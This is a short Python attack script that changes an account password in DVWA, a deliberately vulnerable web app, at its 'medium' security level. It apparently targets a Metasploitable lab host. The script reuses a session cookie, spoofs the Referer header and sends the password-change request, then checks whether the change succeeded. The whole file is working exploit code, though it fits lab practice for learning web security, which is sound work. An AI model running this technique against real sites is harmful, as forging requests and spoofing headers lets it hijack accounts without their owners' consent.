import requests


session = requests.Session()

target_url = input("Enter the target URL for the CSRF attack (e.g., http://<Metasploitable_IP>/dvwa/vulnerabilities/csrf/): ")
new_pass = input("Enter the new password: ")
confirmed_pass = input("Confirm the new password: ")

#get PHPSESSID from the user
#this is usually found in your browser's cookie storage after you log in
php_session_id = input("Enter your PHPSESSID: ")

#spoofed Referer header
#this should be the same as server
spoofed_referer = input("Enter the spoofed Referer (e.g., http://<Metasploitable_IP>/dvwa/vulnerabilities/csrf/): ")

# Session cookies
cookies = {
    "PHPSESSID": php_session_id,
    "security": "medium"
}

#headers with spoofed Referer
headers = {
    "Referer": spoofed_referer
}

#payload for GET request
params = {
    "password_new": new_pass,
    "password_conf": confirmed_pass,
    "Change": "Change"
}

#send GET request with cookies and headers
response = session.get(target_url, cookies=cookies, headers=headers, params=params)

#check if the password change was successful
if "<pre> Password Changed </pre>" in response.text:
    print("Password successfully changed!")
else:
    print("Password change failed. Check your session, spoofed Referer, or payload.")
